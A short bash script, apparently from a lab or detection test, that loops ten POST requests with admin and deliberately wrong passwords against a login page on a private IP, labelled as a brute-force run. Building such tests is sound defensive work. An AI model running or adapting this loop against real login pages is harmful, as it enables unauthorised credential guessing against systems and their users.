#!/bin/bash

TARGET="http://10.30.141.95/login.php"

echo "[*] Running Brute Force..."

for i in {1..10}
do
    curl -X POST $TARGET \
    -d "username=admin&password=wrong$i"
    sleep 0.5
done